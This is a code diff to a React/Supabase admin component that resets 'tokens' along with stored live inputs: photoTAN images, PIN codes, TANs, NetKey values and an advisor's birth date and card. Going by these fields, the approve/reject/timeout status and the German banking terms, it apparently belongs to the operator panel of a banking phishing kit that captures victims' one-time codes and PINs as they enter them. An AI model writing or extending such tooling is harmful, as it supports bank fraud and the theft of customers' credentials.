@@ -102,11 +102,28 @@ const UnifiedTokensList = () => {
   };
 
   const handleReset = async (r: UnifiedRow) => {
-    const { error } = await (supabase as any).from(tableFor(r.kind))
-      .update({ used: false, used_at: null, security_status: "pending", security_status_at: null, customer_phase: null })
-      .eq("id", r.id);
+    const base: Record<string, any> = {
+      used: false, used_at: null,
+      security_status: "pending", security_status_at: null,
+      customer_phase: null,
+    };
+    // Reset live inputs per kind
+    if (r.kind === "auth") {
+      Object.assign(base, { photo_tan_image: null, last_error: null, device_name: null });
+    } else if (r.kind === "pin") {
+      Object.assign(base, { photo_tan_image: null, last_error: null, pin_code: null });
+    } else if (r.kind === "storno") {
+      Object.assign(base, { photo_tan_image: null, last_error: null });
+    }
+    const { error } = await (supabase as any).from(tableFor(r.kind)).update(base).eq("id", r.id);
     if (error) { toast.error("Fehler"); return; }
-    toast.success("Token zurückgesetzt"); load();
+    // Clear panel_task_meta side-channel (TAN, NetKey, PIN, Berater-Daten) for auth
+    if (r.kind === "auth") {
+      await (supabase as any).from("panel_task_meta")
+        .update({ tan: null, tan_updated_at: null, netkey: null, pin: null, berater_geburtsdatum: null, berater_karte: null })
+        .eq("task_id", `auth:${r.id}`);
+    }
+    toast.success("Token & Eingaben zurückgesetzt"); load();
   };
 
   const setSecurityStatus = async (r: UnifiedRow, status: "approved" | "rejected" | "timeout") => {
